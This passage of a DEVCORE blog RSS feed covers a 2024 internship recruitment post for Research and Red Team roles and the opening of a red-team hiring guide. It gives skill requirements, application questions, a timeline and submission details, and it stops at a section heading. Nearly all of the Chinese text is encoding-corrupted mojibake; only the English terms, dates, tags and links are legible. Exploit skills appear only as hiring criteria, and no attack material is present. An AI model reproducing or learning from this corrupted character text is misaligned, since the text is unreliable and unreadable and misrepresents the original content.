  &lt;li&gt;Â∞çË≥áÊ†ºÊúâ‰ªª‰ΩïÁñëÊÖÆÔºåÊ≠°Ëøé‰æÜ‰ø°Ë©¢Âïè&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;È†êË®àÊãõÊî∂ÂêçÈ°ç&quot;&gt;È†êË®àÊãõÊî∂ÂêçÈ°ç&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Research ÁµÑÔºö2~3 ‰∫∫&lt;/li&gt;
  &lt;li&gt;Red Team ÁµÑÔºö2~3 ‰∫∫&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Ëñ™Ë≥áÂæÖÈÅá&quot;&gt;Ëñ™Ë≥áÂæÖÈÅá&lt;/h3&gt;

&lt;p&gt;ÊØèÊúàÊñ∞Âè∞Âπ£ 16,000 ÂÖÉ&lt;/p&gt;

&lt;h2 id=&quot;ÊãõÂãüÊ¢ù‰ª∂Ë≥áÊ†ºËàáÊµÅÁ®ã&quot;&gt;ÊãõÂãüÊ¢ù‰ª∂Ë≥áÊ†ºËàáÊµÅÁ®ã&lt;/h2&gt;

&lt;h3 id=&quot;ÂØ¶ÁøíÊ¢ù‰ª∂Ë¶ÅÊ±Ç&quot;&gt;ÂØ¶ÁøíÊ¢ù‰ª∂Ë¶ÅÊ±Ç&lt;/h3&gt;

&lt;h4 id=&quot;research-binaryweb&quot;&gt;Research (Binary/Web)&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Âü∫Êú¨ÊºèÊ¥ûÂà©Áî®ÂèäÊåñÊéòËÉΩÂäõ&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÁ†îÁ©∂ÁÜ±Ë™†ÔºåÁøíÊÖ£‰∫ÜËß£ÊäÄË°ìÊú¨Ë≥™&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâ‰ªª‰∏ÄÁ®Æ Scripting LanguageÔºàÂ¶ÇÔºöShell Script„ÄÅPython„ÄÅRubyÔºâÔºå‰∏¶ËÉΩ‰ΩøÁî®ËÖ≥Êú¨Ëºî‰ª•Á†îÁ©∂&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÈô§ÈåØËÉΩÂäõÔºåËÉΩÂñÑÁî® Debugger ËøΩËπ§Á®ãÂºèÊµÅÁ®ã„ÄÅËÉΩÈáçÁèæ‰∏¶Êî∂ÊñÇÂïèÈ°å&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÁç®Á´ãÂàÜÊûêÈñãÊîæÂéüÂßãÁ¢ºÂ∞àÊ°àÁöÑËÉΩÂäõÔºåËÉΩÈÄèÈÅéÂàÜÊûêÁ®ãÂºèÁ¢ºÁêÜËß£ÁõÆÊ®ôÂ∞àÊ°àÁöÑÊû∂Êßã&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâ‰∏¶ÁêÜËß£Â∏∏Ë¶ãÁöÑÊºèÊ¥ûÊàêÂõ†
    &lt;ul&gt;
      &lt;li&gt;OWASP Web Top 10&lt;/li&gt;
      &lt;li&gt;Memory Corruption&lt;/li&gt;
      &lt;li&gt;Race Condition&lt;/li&gt;
      &lt;li&gt;‚Ä¶&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Âä†ÂàÜ‰ΩÜ&lt;strong&gt;ÈùûÂøÖË¶Å&lt;/strong&gt;Ê¢ù‰ª∂
    &lt;ul&gt;
      &lt;li&gt;CTF ÊØîË≥ΩÁ∂ìÈ©ó&lt;/li&gt;
      &lt;li&gt;pwnable.tw ÊàêÁ∏æ&lt;/li&gt;
      &lt;li&gt;ÊúâÂÖ¨ÈñãÁöÑÊäÄË°ì blog/slide„ÄÅwrite-ups ÊàñÊòØÊºîË¨õ&lt;/li&gt;
      &lt;li&gt;Á≤æÈÄö IDA Pro Êàñ Ghidra&lt;/li&gt;
      &lt;li&gt;ÁÜüÊÇâ‰ªª‰∏ÄÁ®ÆÁ∂≤È†ÅÁ®ãÂºèË™ûË®ÄÊàñÊ°ÜÊû∂ÔºàÂ¶ÇÔºöPHP„ÄÅASP.NET„ÄÅExpress.jsÔºâÔºåÂÖ∑ÂÇôÂèØ‰ª•Âª∫Á´ãÂÆåÊï¥Á∂≤È†ÅÊúçÂãôÁöÑËÉΩÂäõ&lt;/li&gt;
      &lt;li&gt;ÁêÜËß£ &lt;a href=&quot;https://portswigger.net/web-security/all-materials&quot;&gt;PortSwigger Web Security Academy&lt;/a&gt; ‰∏≠ÁöÑÂÆâÂÖ®Ë≠∞È°å&lt;/li&gt;
      &lt;li&gt;Áç®Á´ãÊåñÊéòÈÅé 0-day ÊºèÊ¥ûÔºåÊàñÂàÜÊûêÈÅé 1-day ÁöÑÁ∂ìÈ©ó&lt;/li&gt;
      &lt;li&gt;ÂÖ∑ÂÇô‰∏ãÂàóÂÖ∂‰∏≠‰πã‰∏ÄÁ∂ìÈ©ó
        &lt;ul&gt;
          &lt;li&gt;Web Application Exploit&lt;/li&gt;
          &lt;li&gt;Kernel Exploit&lt;/li&gt;
          &lt;li&gt;Windows Exploit&lt;/li&gt;
          &lt;li&gt;Browser Exploit&lt;/li&gt;
          &lt;li&gt;Bug Bounty&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;red-team&quot;&gt;Red Team&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;ÁÜüÊÇâ OWASP Web Top 10&lt;/li&gt;
  &lt;li&gt;ÁêÜËß£ &lt;a href=&quot;https://portswigger.net/web-security/all-materials&quot;&gt;PortSwigger Web Security Academy&lt;/a&gt; ‰∏≠ÊâÄÊúâÁöÑÂÆâÂÖ®Ë≠∞È°åÊàñÂ∑≤ÂÆåÊàêÊâÄÊúâ Lab&lt;/li&gt;
  &lt;li&gt;ÁêÜËß£Ë®àÁÆóÊ©üÁ∂≤Ë∑ØÁöÑÂü∫Êú¨Ê¶ÇÂøµ&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâ‰ªª‰∏ÄÁ®ÆÁ∂≤È†ÅÁ®ãÂºèÈñãÁôºÊñπÂºèÔºàÂ¶ÇÔºöPHP„ÄÅASP.NET„ÄÅJSPÔºâÔºåÂÖ∑ÂÇôÂèØ‰ª•Âª∫Á´ãÂÆåÊï¥Á∂≤È†ÅÊúçÂãôÁöÑËÉΩÂäõ&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâ‰ªª‰∏ÄÁ®Æ Scripting LanguageÔºàÂ¶ÇÔºöShell Script„ÄÅPython„ÄÅRubyÔºâÔºå‰∏¶ËÉΩ‰ΩøÁî®ËÖ≥Êú¨Ëºî‰ª•Á†îÁ©∂&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÈô§ÈåØËÉΩÂäõÔºåËÉΩÂñÑÁî® Debugger ËøΩËπ§Á®ãÂºèÊµÅÁ®ã„ÄÅËÉΩÈáçÁèæ‰∏¶Êî∂ÊñÇÂïèÈ°å&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÂèØ‰ª•Âª∫ÁΩÆ„ÄÅË®≠ÂÆöÂ∏∏Ë¶ãÁ∂≤È†Å‰º∫ÊúçÂô®ÔºàÂ¶ÇÔºöNginx„ÄÅApache„ÄÅTomcat„ÄÅIISÔºâÂèä‰ΩúÊ•≠Á≥ªÁµ±ÔºàÂ¶ÇÔºöLinux„ÄÅWindowsÔºâÁöÑËÉΩÂäõ&lt;/li&gt;
  &lt;li&gt;Âä†ÂàÜ‰ΩÜ&lt;strong&gt;ÈùûÂøÖË¶Å&lt;/strong&gt;Ê¢ù‰ª∂
    &lt;ul&gt;
      &lt;li&gt;ÊõæÁ∂ìÁç®Á´ãÊåñÊéòÈÅé 0-day ÊºèÊ¥û&lt;/li&gt;
      &lt;li&gt;ÊõæÁ∂ìÁç®Á´ãÂàÜÊûêÈÅéÂ∑≤Áü•ÊºèÊ¥û‰∏¶ËÉΩÊí∞ÂØ´ 1-day Exploit&lt;/li&gt;
      &lt;li&gt;ÊõæÁ∂ìÊñº CTF ÊØîË≥Ω‰∏≠Êìî‰ªªÂá∫È°åËÄÖ‰∏¶Âª∫ÁΩÆÈÅéÈ°åÁõÆ&lt;/li&gt;
      &lt;li&gt;ÊìÅÊúâ OSCP Ë≠âÁÖßÊàñÂêåÁ≠âËÉΩÂäõ‰πãË≠âÁÖß&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÊáâÂæµÊµÅÁ®ã&quot;&gt;ÊáâÂæµÊµÅÁ®ã&lt;/h3&gt;

&lt;p&gt;Êú¨Ê¨°ÁîÑÈÅ∏‰∏ÄÂÖ±ÂàÜÁÇ∫‰∫åÂÄãÈöéÊÆµÔºö&lt;/p&gt;

&lt;h4 id=&quot;Á¨¨‰∏ÄÈöéÊÆµÊõ∏Èù¢ÂØ©Êü•&quot;&gt;Á¨¨‰∏ÄÈöéÊÆµÔºöÊõ∏Èù¢ÂØ©Êü•&lt;/h4&gt;

&lt;p&gt;Á¨¨‰∏ÄÈöéÊÆµÁÇ∫Êõ∏Èù¢ÂØ©Êü•ÔºåÊúÉÈúÄË¶ÅÂØ©Êü•‰∏ãÂàóÂÖ©ÂÄãÈ†ÖÁõÆ&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Â±•Ê≠∑ÂÖßÂÆπ&lt;/li&gt;
  &lt;li&gt;Á∞°Á≠îÈ°åÁ≠îÊ°à
    &lt;ul&gt;
      &lt;li&gt;ÊáâÂæµ Research ÂØ¶ÁøíÁîüÔºö
        &lt;ul&gt;
          &lt;li&gt;È°åÁõÆ‰∏ÄÔºöÊºèÊ¥ûÈáçÁèæËàáÂàÜÊûêÈÅéÁ®ã
            &lt;ul&gt;
              &lt;li&gt;Ë´ãÊèêÂá∫‰∏ÄÂÄãÔºå‰Ω†Âç∞Ë±°ÊúÄÊ∑±ÂàªÊàñÊÑüÂà∞ÊúâË∂£„ÄÅÊñºË•øÂÖÉ 2022 ~ 2024 Âπ¥ÈñìÂÖ¨ÈñãÁöÑÁúüÂØ¶ÊºèÊ¥ûÊàñÊîªÊìäÈèàÊ°à‰æãÔºå‰∏¶‰æùËá™Â∑±ÁöÑÁêÜËß£Ë©≥Ëø∞Ë™™ÊòéÊºèÊ¥ûÁöÑÊàêÂõ†„ÄÅÂà©Áî®Ê¢ù‰ª∂ÂíåÂèØ‰ª•ÈÄ†ÊàêÁöÑÂΩ±Èüø„ÄÇÂêåÊôÇÔºåÂòóË©¶ÊèèËø∞Â¶Ç‰ΩïÂæ©ÁèæÊ≠§ÊºèÊ¥ûÊàñÊîªÊìäÈèàÔºåÂç≥‰ΩøÁÑ°Ê≥ïÊàêÂäüÂæ©ÁèæÔºå‰πüË´ãË®òÈåÑÁ†îÁ©∂ÈÅéÁ®ã„ÄÇÂ†±ÂëäÊí∞ÂØ´Ë´ãÂèÉËÄÉ&lt;a href=&quot;/assets/files/recruit/binary/2024_6th_intern_analysis_example.pdf&quot;&gt;ÁØÑÊú¨&lt;/a&gt;ÔºåÁõ°ÂèØËÉΩË©≥Á¥∞Ôºå‰∏≠Ëã±‰∏çÈôê„ÄÇ&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;È°åÁõÆ‰∫åÔºöÂØ¶ÁøíÊúüÈñìÊÉ≥Ë¶ÅÁ†îÁ©∂ÁöÑ‰∏ªÈ°å
            &lt;ul&gt;
              &lt;li&gt;Ë´ãÊèêÂá∫‰∏âÂÄãÂèØËÉΩÈÅ∏ÊìáÁöÑÊòéÁ¢∫‰∏ªÈ°åÔºå‰∏¶Á∞°ÂñÆË™™ÊòéÊèêÂá∫ÁöÑÁêÜÁî±ÊàñÊÉ≥ÂÆåÊàêÁöÑÂÖßÂÆπÔºå‰æãÂ¶ÇÔºö
                &lt;ul&gt;
                  &lt;li&gt;Á†îÁ©∂‚óØ‚óØÈñãÊ∫êËªüÈ´îÔºåÊâæÂà∞ÂèØ RCE ÁöÑÈáçÂ§ßÈ¢®Èö™Âº±Èªû„ÄÇ&lt;/li&gt;
                  &lt;li&gt;Á†îÁ©∂Â∏∏Ë¶ãÁöÑË∑ØÁî±Âô®ÔºåÁõÆÊ®ôÂåÖÊã¨ÔºöAA-123 Ë∑ØÁî±Âô®„ÄÅBB-456 ÁÑ°Á∑öË∑ØÁî±Âô®„ÄÇ&lt;/li&gt;
                  &lt;li&gt;Á†îÁ©∂Â∏∏Ë¶ãÁöÑÁ≠ÜË®òÂπ≥Âè∞ÊàñËªüÈ´îÔºåÁõÆÊ®ôÂåÖÊã¨ÔºöXX Note„ÄÅYY Note„ÄÇ&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;ÊáâÂæµ Red Team ÂØ¶ÁøíÁîüÔºö
        &lt;ul&gt;
          &lt;li&gt;Ë´ãÊèêÂá∫ÂÖ©ÂÄãÊñºË•øÂÖÉ 2022 ~ 2024 Âπ¥ÈñìÂÖ¨ÈñãÁöÑ„ÄÅËàá Web ÊîªÊìäÈù¢„ÄÅÊºèÊ¥ûÊàñÊîªÊìäÈèàÁõ∏ÈóúÁöÑÊºîË¨õ„ÄÇË´ãË™™ÊòéÁÇ∫‰ªÄÈ∫ºÊåëÈÅ∏ÈÄô‰∫õÊºîË¨õ‰∏¶Ëß£ÈáãÂÆÉÂÄëÁÇ∫‰ªÄÈ∫ºÊúâË∂£„ÄÇÁî®‰Ω†ÁöÑË©±Ë©≥Á¥∞Ëß£ÈáãÈÄô‰∫õÊºîË¨õÁöÑÁ¥∞ÁØÄÔºå‰∏¶Êèê‰æõ‰ªª‰Ωï‰Ω†Ë¶∫ÂæóÂèØ‰ª•ËºîÂä©ÊàñË≠âÊòé‰Ω†ÁêÜËß£ÁöÑÈôÑÂä†Ë≥áÊñô„ÄÇÈÄô‰∫õÊºîË¨õÂèØ‰ª•‰æÜËá™ÂåÖÂê´‰ΩÜ‰∏çÈôêÊñº Black Hat„ÄÅDEF CON„ÄÅOffensiveCon„ÄÅPOC„ÄÅZeroConf„ÄÅHexacon„ÄÅHITCON„ÄÅTROOPERS CONFERENCE Á≠âÊúÉË≠∞„ÄÇ&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Êú¨ÈöéÊÆµÊî∂‰ª∂Êà™Ê≠¢ÊôÇÈñìÁÇ∫ &lt;strong&gt;2024/08/09 23:59&lt;/strong&gt;ÔºåÊàëÂÄëÊúÉÊ†πÊìöÊÇ®ÁöÑÂ±•Ê≠∑ÂèäÈ°åÁõÆÊâÄÂõûÁ≠îÁöÑÂÖßÂÆπ‰æÜÊ±∫ÂÆöÊòØÂê¶ÊúâÈÄöÈÅéÁ¨¨‰∏ÄÈöéÊÆµÔºåÊàëÂÄëÊúÉÂú® 10 ÂÄã&lt;strong&gt;Â∑•‰ΩúÂ§©&lt;/strong&gt;ÂÖßÂõûË¶Ü„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;Á¨¨‰∫åÈöéÊÆµÈù¢Ë©¶&quot;&gt;Á¨¨‰∫åÈöéÊÆµÔºöÈù¢Ë©¶&lt;/h4&gt;

&lt;p&gt;Ê≠§ÈöéÊÆµÁÇ∫ 30~120 ÂàÜÈêòÔºà‰æùÁÖßÁµÑÂà•ÈúÄÊ±ÇËÄåÂÆöÔºåÊúÉÂè¶Ë°åÈÄöÁü•ÔºâÁöÑÈù¢Ë©¶ÔºåÊúÉÊúâ 2~3 ‰ΩçË≥áÊ∑±Â§•‰º¥ÂèÉËàáÔºåË©ï‰º∞ÊÇ®ÊòØÂê¶ÂÖ∑ÂÇôÊú¨Ê¨°ÂØ¶ÁøíÊâÄÈúÄÁöÑÊäÄË°ìËÉΩÂäõËàá‰∫∫Ê†ºÁâπË≥™„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;ÊôÇÈñìËª∏&quot;&gt;ÊôÇÈñìËª∏&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;2024/07/18 - 2024/08/09 ÂÖ¨ÈñãÊãõÂãü&lt;/li&gt;
  &lt;li&gt;2024/08/12 - 2024/08/22 Èù¢Ë©¶&lt;/li&gt;
  &lt;li&gt;2024/08/26 ÂâçÂõûÊáâÁµêÊûú&lt;/li&gt;
  &lt;li&gt;2024/09/02 Á¨¨ÂÖ≠Â±ÜÂØ¶ÁøíË®àÁï´ÊñºÁï∂ÈÄ±ÈñãÂßã&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Â†±ÂêçÊñπÂºè&quot;&gt;Â†±ÂêçÊñπÂºè&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Ë´ãÂ∞áÊÇ®ÁöÑ&lt;strong&gt;Â±•Ê≠∑&lt;/strong&gt;Âèä&lt;strong&gt;È°åÁõÆÁ≠îÊ°à&lt;/strong&gt;‰ª• PDF Ê†ºÂºèÂØÑÂà∞ recruiting_intern@devco.re
    &lt;ul&gt;
      &lt;li&gt;Â±•Ê≠∑Ê†ºÂºèË´ãÂèÉËÄÉÁØÑ‰æãÁ§∫ÊÑèÔºà&lt;a href=&quot;/assets/files/recruit/Resume_Example.docx&quot;&gt;DOCX&lt;/a&gt;„ÄÅ&lt;a href=&quot;/assets/files/recruit/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;„ÄÅ&lt;a href=&quot;/assets/files/recruit/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;Ôºâ‰∏¶ËΩâÊàê PDF„ÄÇËã•ÊÇ®ÊúâËá™‰ø°Ôºå‰πüÂèØ‰ª•Ëá™Áî±ÁôºÊèÆÊúÄËÉΩÂëàÁèæÊÇ®ËÉΩÂäõÁöÑÂ±•Ê≠∑„ÄÇ&lt;/li&gt;
      &lt;li&gt;Ë´ãÊñº &lt;strong&gt;2024/08/09 23:59&lt;/strong&gt; ÂâçÂØÑÂá∫ÔºàÂ¶ÇÊûúÂêçÈ°çÂ∑≤ÊªøÂâáË¶ñÊÉÖÊ≥ÅÊèêÊó©ÁµêÊùüÔºâ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;‰ø°‰ª∂Ê®ôÈ°åÊ†ºÂºèÔºö[ÊáâÂæµ] ËÅ∑‰Ωç ÊÇ®ÁöÑÂßìÂêçÔºàÁØÑ‰æãÔºö[ÊáâÂæµ] Red Team ÁµÑÂØ¶ÁøíÁîü ÁéãÂ∞èÁæéÔºâ&lt;/li&gt;
  &lt;li&gt;Â±•Ê≠∑ÂÖßÂÆπË´ãÂãôÂøÖÊéßÂà∂Âú®‰∏âÈ†Å‰ª•ÂÖßÔºåËá≥Â∞ëÈúÄÂåÖÂê´‰ª•‰∏ãÂÖßÂÆπÔºö
    &lt;ul&gt;
      &lt;li&gt;Âü∫Êú¨Ë≥áÊñô&lt;/li&gt;
      &lt;li&gt;Â≠∏Ê≠∑&lt;/li&gt;
      &lt;li&gt;ÂØ¶ÁøíÁ∂ìÊ≠∑&lt;/li&gt;
      &lt;li&gt;Á§æÁæ§Ê¥ªÂãïÁ∂ìÊ≠∑&lt;/li&gt;
      &lt;li&gt;ÁâπÊÆä‰∫ãËπü&lt;/li&gt;
      &lt;li&gt;ÈÅéÂéªÂ∞çÊñºË≥áÂÆâÁöÑÁõ∏ÈóúÁ†îÁ©∂&lt;/li&gt;
      &lt;li&gt;MBTI ËÅ∑Ê•≠ÊÄßÊ†ºÊ∏¨Ë©¶ÁµêÊûúÔºà&lt;a href=&quot;https://www.16personalities.com/tw&quot;&gt;Ê∏¨Ë©¶Á∂≤È†Å&lt;/a&gt;Ôºâ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ëã•ÊúâÊáâÂæµÁõ∏ÈóúÂïèÈ°åÔºåË´ã‰∏ÄÂæã‰ΩøÁî® Email ËÅØÁπ´ÔºåÂ¶ÇÈÄ†ÊàêÊÇ®ÁöÑ‰∏ç‰æøË´ãË¶ãË´íÔºåÊàëÂÄëÊÑüË¨ùÊÇ®ÁöÑ‰æÜ‰ø°Ôºå‰∏¶ÊúüÂæÖÊÇ®ÁöÑÂä†ÂÖ•ÔºÅ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2024/07/18/6th-internship-program-recruit/</link>
                <guid>https://devco.re/blog/2024/07/18/6th-internship-program-recruit</guid>
                <pubDate>Thu, 18 Jul 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Á¥ÖÈöäÊºîÁ∑¥Â∞àÂÆ∂ÊáâÂæµÊåáÂçó</title>
                <description>&lt;p&gt;Á¥ÖÈöäÊºîÁ∑¥ÊòØ DEVCORE ÊúÄÊ†∏ÂøÉÁöÑÊ•≠Âãô„ÄÇÊàëÂÄëÊìÅÊúâË±êÂØåÁöÑÂØ¶Êà∞Á∂ìÈ©óÔºå‰∏¶‰∏îÈõÜÁµê‰∫Ü‰∏ÄÁæ§ÂÑ™ÁßÄÁöÑÂ§•‰º¥ÂÖ±ÂêåËøéÊé•ÊåëÊà∞„ÄÇÂæàÂ§öÊäÄË°ìÊÑõÂ•ΩËÄÖÂ∏åÊúõÂä†ÂÖ•ÊàëÂÄëÔºåÊÉ≥Ë¶Å‰∫ÜËß£ÊàëÂÄëÈåÑÂèñÊñ∞‰∫∫ÊâÄÁúãÈáçÁöÑÊñπÂêë„ÄÇË∂ÅËëóÁï¢Ê•≠Â≠£Ê±ÇËÅ∑ÊΩÆÔºåÊàëÂÄëÁâπÂà•Ê∫ñÂÇô‰∫ÜÈÄô‰ªΩÊáâÂæµÊåáÂçóÔºåÂ∏åÊúõÂπ´Âä©ÊúâËààË∂£ÁöÑ‰∫∫‰∫ÜËß£Ê∫ñÂÇôÊñπÂêëÔºå‰πüÂ∏åÊúõÂπ´Âä©‰∏Ä‰∫õÂâõÁï¢Ê•≠„ÄÅ‰∏çÊìÖÈï∑Êí∞ÂØ´Â±•Ê≠∑„ÄÅ‰∏çÊìÖÈï∑Âú®Èù¢Ë©¶‰∏≠Ë°®ÈÅîËá™Â∑±ÁöÑ‰∫∫ÔºåË£úË∂≥ÂøÖË¶ÅÊäÄËÉΩ‰ª•ÂÖçÈåØÂ§±Ê©üÊúÉ„ÄÇÁÑ°Ë´ñÊÇ®Â∞çÁ¥ÖÈöäÊºîÁ∑¥Â∞àÂÆ∂ÊàñÊª≤ÈÄèÊ∏¨Ë©¶Â∑•Á®ãÂ∏´ÊÑüËààË∂£ÔºåÊúüÊúõÂèØ‰ª•Âæ™ËëóÈÄô‰ªΩÊåáÂçóÔºåÊàêÁÇ∫ÊàëÂÄëÁöÑÂ§•‰º¥„ÄÇ&lt;/p&gt;

&lt;p&gt;È†ÜÂ∏∂‰∏ÄÊèêÔºåÊúâ‰∏ÄÂÄãÂú®Â≠∏ÁîüÂèØËÉΩÊÑüËààË∂£ÁöÑË≥áË®äÔºöDEVCORE ÊúâÁ†îÁôºÊõø‰ª£ÂΩπÂêçÈ°çÔºåÂîØÂêçÈ°çÊúâÈôêÔºåÊé®Ëñ¶ÊÇ®Âú®Â≠∏ÊúüÈñìÁõ°Êó©ÊäïÈÅûÂ±•Ê≠∑‰∏¶Ë©¢ÂïèÊõø‰ª£ÂΩπÁãÄÊ≥Å„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;-devcore-ÊáâÂæµÊµÅÁ®ã&quot;&gt;üöÄ DEVCORE ÊáâÂæµÊµÅÁ®ã&lt;/h2&gt;

&lt;p&gt;ÊáâÂæµÁ¥ÖÈöäÊºîÁ∑¥Â∞àÂÆ∂„ÄÅÊª≤ÈÄèÊ∏¨Ë©¶Â∑•Á®ãÂ∏´ÈÉΩÊúÉÁ∂ìÊ≠∑„ÄåÊõ∏Èù¢ÂØ©Êü•„Äç„ÄÅ„ÄåÁ∑ö‰∏äÊ∏¨È©ó„Äç„ÄÅ„ÄåÈù¢Ë©¶„Äç‰∏âÂÄãÈöéÊÆµ„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;-Êõ∏Èù¢ÂØ©Êü•&quot;&gt;üìå Êõ∏Èù¢ÂØ©Êü•&lt;/h3&gt;

&lt;p&gt;Â±•Ê≠∑ÊòØÈÄôÂÄãÈöéÊÆµ‰∏ªË¶ÅË©ï‰º∞‰æùÊìöÔºå‰ª•‰∏ã 4 ÈªûÊòØÊàëÂÄëË™çÁÇ∫ÊáâÂæµËÄÖÈúÄË¶ÅÊ≥®ÊÑèÁöÑÂú∞ÊñπÔºö&lt;/p&gt;

&lt;h4 id=&quot;Â±•Ê≠∑ÂÖßÂÆπÁ¨¶ÂêàËÅ∑ÂãôÈúÄÊ±ÇÂóé&quot;&gt;Â±•Ê≠∑ÂÖßÂÆπÁ¨¶ÂêàËÅ∑ÂãôÈúÄÊ±ÇÂóé&lt;/h4&gt;

&lt;p&gt;ÈÄôÂÄãÈöéÊÆµÊúÄÈáçË¶ÅÁöÑÊòØË™™ÊúçÂØ©Ê†∏ËÄÖ‰Ω†ÂÖ∑ÂÇôËÅ∑ÂãôÈúÄÊ±ÇÁöÑËÉΩÂäõÔºåÊâÄ‰ª•Ë´ãÁõ°ÈáèÂú®Â±•Ê≠∑ÂÖßÂÆπÈôÑ‰∏äËÉΩÂπ´Âä©Âà•‰∫∫Âà§Êñ∑ÁöÑ‰ΩêË≠âË≥áË®ä„ÄÇÈÅéÂéªÊúâ‰∫õÊäÄË°ìÂ∫ï‰∏çÈåØÁöÑÂêåÂ≠∏Âè™ÂñÆÁ¥îÊîæ‰∫ÜÂ≠∏Ê≠∑ÔºåÈÄôÊ®£Ë¶ÅËÆìÂØ©Ê†∏ËÄÖÊÉ≥ÊâæÂÄãÂèØ‰ª•ÈÄ≤ÂÖ•‰∏ã‰∏ÄÈöéÊÆµÁöÑÁêÜÁî±ÈÉΩÈõ£ÔºåÁõ∏Áï∂ÂèØÊÉú„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;Áî®‰∏Ä‰∫õÂØ¶‰æãË™™ÊòéÂêß&quot;&gt;Áî®‰∏Ä‰∫õÂØ¶‰æãË™™ÊòéÂêß&lt;/h4&gt;

&lt;p&gt;ÂØ¶‰æãË≠âÊòéÊòØËÆì‰Ω†ÁöÑÂ±•Ê≠∑ËÑ´Á©éËÄåÂá∫ÁöÑÈóúÈçµÔºåÂÖ∑È´îÁöÑÊï∏Â≠óÂíå‰∫ãÂØ¶ÂèØ‰ª•Â§ßÂ§ßÂ¢ûÂä†Â±•Ê≠∑ÁöÑË™™ÊúçÂäõÔºå‰æãÂ¶ÇËÉΩÂÖ∑È´îË™™Âá∫ÊâìÈÅéÂ§öÂ∞ëÂ†¥Êª≤ÈÄèÊ∏¨Ë©¶ÔºåÂú®ÈÅéÁ®ã‰∏≠Êâæ‰∫ÜÂ§öÂ∞ëÊºèÊ¥ûÔºåÊàñÂú®‰ªªÂãô‰∏≠Ëß£Ê±∫‰∫Ü‰ªÄÈ∫ºÊ®£ÁöÑÂïèÈ°åÔºåÈÅîÂà∞‰ªÄÈ∫ºÊïàÊûú„ÄÇÈÄô‰∫õ‰∏çÂÉÖËÉΩË°®Á§∫ÊäÄË°ìËÉΩÂäõÔºåÈÇÑËÉΩÈ°ØÁ§∫‰Ω†ÁöÑÂΩ±ÈüøÂäõ„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;Êèê‰æõÊúâÂπ´Âä©ÁöÑÈ°çÂ§ñË≥áË®ä&quot;&gt;Êèê‰æõÊúâÂπ´Âä©ÁöÑÈ°çÂ§ñË≥áË®ä&lt;/h4&gt;

&lt;p&gt;Áõ∏ÈóúÂ∞àÊ•≠Ë≠âÁÖß„ÄÅÂèÉËàáÊäÄË°ìÁ§æÁæ§„ÄÅË≤¢ÁçªÈñãÊ∫êÂ∞àÊ°àÁ≠âÈ°çÂ§ñË≥áË®äÈÉΩÊúâÂä©ÊñºÂØ©Ê†∏ËÄÖË©ï‰º∞„ÄÇÊúâ‰∫õ‰∫∫Â•ΩÂ•á‰∏Ä‰∫õÈùûÊäÄË°ìÁ≠âÁ∂ìÈ©óÊáâ‰∏çÊáâË©≤ÊîæÂú®Â±•Ê≠∑‰∏≠ÔºåÊàëÂÄëÈ†êË®≠ÊòØ‰∏çÊúÉÁâπÂà•ÂèÉËÄÉÔºå‰ΩÜÂ¶ÇÊûú‰Ω†Ë™çÁÇ∫ÈÄô‰∫õÁ∂ìÈ©óÂ∞çÊú™‰æÜÂ∑•‰ΩúÊúâÊ≠£Èù¢ÂΩ±ÈüøÔºåÂèØÈôÑ‰∏äËÆìÂØ©Ê†∏ËÄÖË©ï‰º∞„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;ÁâπÂà•Â∏åÊúõÂàóÂá∫ÁöÑÂä†ÂàÜÈ†Ö&quot;&gt;ÁâπÂà•Â∏åÊúõÂàóÂá∫ÁöÑÂä†ÂàÜÈ†Ö&lt;/h4&gt;

